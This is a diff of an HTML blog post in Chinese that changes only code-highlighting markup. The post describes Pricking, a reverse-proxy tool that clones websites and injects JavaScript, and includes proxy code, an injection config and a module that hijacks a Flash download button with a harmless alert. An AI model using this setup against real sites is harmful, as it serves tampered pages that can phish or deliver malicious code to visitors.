+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中<code>ModifyResponse</code>是用来修改Response的，Response中包含了响应头和响应内容。</p>
 <p><a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L211">Pricking</a>的实现方式：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">proxy</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">remote</span>)
-<span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">ModifyResponse</span> = <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">modifyResponse</span>
-</code></pre></div><p><code>handler.modifyResponse</code>中主要进行<a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%2523js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L81">对响应内容的处理</a>，比如注入js、修改响应头等操作。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">proxy</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">remote</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">ModifyResponse</span> = <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">modifyResponse</span>
+</span></span></code></pre></div><p><code>handler.modifyResponse</code>中主要进行<a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%2523js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L81">对响应内容的处理</a>，比如注入js、修改响应头等操作。</p>
 <p><code>modifyResponse</code>传入的是<code>http.Response</code>对象，如果要修改除<code>Header</code>以外的数据，需要对<code>Response.body</code>进行读取，修改完毕后，再重新赋值<code>Response.body</code>：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">modifyResponse</span>(<span style="color:#a6e22e">w</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Response</span>)<span style="color:#66d9ef">error</span>{
-    <span style="color:#a6e22e">respBodyByte</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Body</span>)
-    <span style="color:#75715e">// .....
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 这里对Response进行修改
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// .....
-</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">ContentLength</span> = int64(len(<span style="color:#a6e22e">respBodyByte</span>))
-    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Set</span>(<span style="color:#e6db74">&#34;Content-Length&#34;</span>, <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Itoa</span>(len(<span style="color:#a6e22e">respBodyByte</span>)))
-    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Body</span> = <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">NopCloser</span>(<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">respBodyByte</span>))
-    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
-}
-</code></pre></div><h3 id="pricking-使用">Pricking 使用</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">modifyResponse</span>(<span style="color:#a6e22e">w</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Response</span>)<span style="color:#66d9ef">error</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">respBodyByte</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Body</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// .....
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 这里对Response进行修改
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// .....
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">ContentLength</span> = int64(len(<span style="color:#a6e22e">respBodyByte</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Set</span>(<span style="color:#e6db74">&#34;Content-Length&#34;</span>, <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Itoa</span>(len(<span style="color:#a6e22e">respBodyByte</span>)))
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Body</span> = <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">NopCloser</span>(<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">respBodyByte</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="pricking-使用">Pricking 使用</h3>
 <p>有Go语言环境 - 本地编译：</p>
 <pre tabindex="0"><code>$ git clone https://github.com/Rvn0xsy/Pricking
 $ cd Pricking
@@ -444,29 +443,29 @@ $ make
 <li>目标域名：https://payloads.online</li>
 </ul>
 <p>配置文件：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">filter_type</span>:
-  - <span style="color:#e6db74">&#34;text/html&#34;</span> <span style="color:#75715e"># 仅针对网页内容进行注入</span>
-<span style="color:#f92672">exclude_file</span>:   <span style="color:#75715e"># 静态文件的数据包不进行注入</span>
-  - <span style="color:#e6db74">&#34;.jpg&#34;</span>
-  - <span style="color:#e6db74">&#34;.css&#34;</span>
-  - <span style="color:#e6db74">&#34;.png&#34;</span>
-  - <span style="color:#e6db74">&#34;.js&#34;</span>
-  - <span style="color:#e6db74">&#34;.ico&#34;</span>
-  - <span style="color:#e6db74">&#34;.svg&#34;</span>
-  - <span style="color:#e6db74">&#34;.gif&#34;</span>
-  - <span style="color:#e6db74">&#34;.jpeg&#34;</span>
-  - <span style="color:#e6db74">&#34;.woff&#34;</span>
-  - <span style="color:#e6db74">&#34;.tff&#34;</span>
-<span style="color:#f92672">static_dir</span>: <span style="color:#e6db74">&#34;./static&#34;</span> <span style="color:#75715e"># Pricking Suite 目录</span>
-<span style="color:#f92672">pricking_prefix_url</span>: <span style="color:#e6db74">&#34;/pricking_static_files&#34;</span> <span style="color:#75715e"># 静态目录名，不能与目标网站冲突</span>
-<span style="color:#f92672">listen_address</span>: <span style="color:#e6db74">&#34;192.168.117.1:9999&#34;</span> <span style="color:#75715e"># 监听地址:端口</span>
-<span style="color:#f92672">inject_body</span>: <span style="color:#e6db74">&#34;&lt;script src=&#39;/pricking_static_files/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;</span> <span style="color:#75715e"># 注入代码</span>
-</code></pre></div><p>Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">filter_type</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;text/html&#34;</span> <span style="color:#75715e"># 仅针对网页内容进行注入</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">exclude_file</span>:   <span style="color:#75715e"># 静态文件的数据包不进行注入</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.jpg&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.css&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.png&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.js&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.ico&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.svg&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.gif&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.jpeg&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.woff&#34;</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#34;.tff&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">static_dir</span>: <span style="color:#e6db74">&#34;./static&#34;</span> <span style="color:#75715e"># Pricking Suite 目录</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">pricking_prefix_url</span>: <span style="color:#e6db74">&#34;/pricking_static_files&#34;</span> <span style="color:#75715e"># 静态目录名，不能与目标网站冲突</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">listen_address</span>: <span style="color:#e6db74">&#34;192.168.117.1:9999&#34;</span> <span style="color:#75715e"># 监听地址:端口</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">inject_body</span>: <span style="color:#e6db74">&#34;&lt;script src=&#39;/pricking_static_files/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;</span> <span style="color:#75715e"># 注入代码</span>
+</span></span></code></pre></div><p>Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-00-37.png" alt=""></p>
 <p>启动Pricking，<strong>确保配置文件、Static在当前目录</strong>：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./pricking -url https://payloads.online
-2021/12/24 14:03:33 Loading config  ./config.yaml
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-10-18.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./pricking -url https://payloads.online
+</span></span><span style="display:flex;"><span>2021/12/24 14:03:33 Loading config  ./config.yaml
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-10-18.png" alt=""></p>
 <p>代理效果：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-05-09.png" alt=""></p>
 <p>查看页面底部：</p>
@@ -475,23 +474,23 @@ $ make
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-14-00.png" alt=""></p>
 <h2 id="0x04-nodejs实现---快速部署与完美克隆">0x04 NodeJS实现 - 快速部署与完美克隆</h2>
 <p><a href="https://github.com/Rvn0xsy/Pricking-node">Pricking-node</a> 实现效果与<a href="https://github.com/Rvn0xsy/Pricking">Pricking</a>类似，但我感觉JS好像更加简洁、方便，因此对照<a href="https://www.npmjs.com/package/http-proxy-middleware">http-proxy-middleware</a>模块编写了一个反向代理脚本。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">createProxyMiddleware</span>, <span style="color:#a6e22e">responseInterceptor</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http-proxy-middleware&#39;</span>);
-
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">proxy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createProxyMiddleware</span>({
-  <span style="color:#75715e">/**
-</span><span style="color:#75715e">   * IMPORTANT: avoid res.end being called automatically
-</span><span style="color:#75715e">   **/</span>
-  <span style="color:#a6e22e">selfHandleResponse</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#75715e">// res.end() will be called internally by responseInterceptor()
-</span><span style="color:#75715e"></span>
-  <span style="color:#75715e">/**
-</span><span style="color:#75715e">   * Intercept response and replace &#39;Hello&#39; with &#39;Goodbye&#39;
-</span><span style="color:#75715e">   **/</span>
-  <span style="color:#a6e22e">onProxyRes</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">responseInterceptor</span>(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">responseBuffer</span>, <span style="color:#a6e22e">proxyRes</span>, <span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">responseBuffer</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;utf8&#39;</span>); <span style="color:#75715e">// convert buffer to string
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;Hello&#39;</span>, <span style="color:#e6db74">&#39;Goodbye&#39;</span>); <span style="color:#75715e">// manipulate response and return the result
-</span><span style="color:#75715e"></span>  }),
-});
-</code></pre></div><p>通过onProxyRes属性可以定义针对Response的修改动作。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">createProxyMiddleware</span>, <span style="color:#a6e22e">responseInterceptor</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http-proxy-middleware&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">proxy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createProxyMiddleware</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * IMPORTANT: avoid res.end being called automatically
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   **/</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">selfHandleResponse</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#75715e">// res.end() will be called internally by responseInterceptor()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * Intercept response and replace &#39;Hello&#39; with &#39;Goodbye&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   **/</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">onProxyRes</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">responseInterceptor</span>(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">responseBuffer</span>, <span style="color:#a6e22e">proxyRes</span>, <span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">responseBuffer</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;utf8&#39;</span>); <span style="color:#75715e">// convert buffer to string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;Hello&#39;</span>, <span style="color:#e6db74">&#39;Goodbye&#39;</span>); <span style="color:#75715e">// manipulate response and return the result
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }),
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>通过onProxyRes属性可以定义针对Response的修改动作。</p>
 <h3 id="pricking-node-使用">Pricking-node 使用</h3>
 <pre tabindex="0"><code>$ npm install -g express
 $ npm install -g http-proxy-middleware
@@ -529,21 +528,21 @@ $ node proxy.js
 <p><a href="https://github.com/Rvn0xsy/Pricking-node/blob/main/pricking-js-suite/modules/flash.cn.js">劫持Flash的代码</a>已经提交到pricking-js-suite，在这里我演示一下：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-04-52.png" alt=""></p>
 <p>将flash模块启用：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ vim pricking-js-suite/static.js
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-07-50.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vim pricking-js-suite/static.js
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-07-50.png" alt=""></p>
 <p>访问: http://localhost:3000 点击立即下载将会触发js代码。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-09-42.png" alt=""></p>
 <p>flash模块的代码如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Loaded flash.cn Module ...&#34;</span>);
-
-<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Download</span>() {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loadLink</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByClassName</span>(<span style="color:#e6db74">&#34;loadLink&#34;</span>);
-    <span style="color:#a6e22e">loadLink</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;disable&#34;</span>)
-    <span style="color:#a6e22e">loadLink</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>,<span style="color:#66d9ef">function</span>(){
-        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Hello Pricking!!&#34;</span>);
-    },<span style="color:#66d9ef">false</span>)
-}
-</code></pre></div><h2 id="参考">参考</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Loaded flash.cn Module ...&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Download</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loadLink</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByClassName</span>(<span style="color:#e6db74">&#34;loadLink&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loadLink</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;disable&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loadLink</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>,<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Hello Pricking!!&#34;</span>);
+</span></span><span style="display:flex;"><span>    },<span style="color:#66d9ef">false</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="参考">参考</h2>
 <ul>
 <li><a href="https://github.com/openresty/docker-openresty">https://github.com/openresty/docker-openresty</a></li>
 <li><a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</a></li>
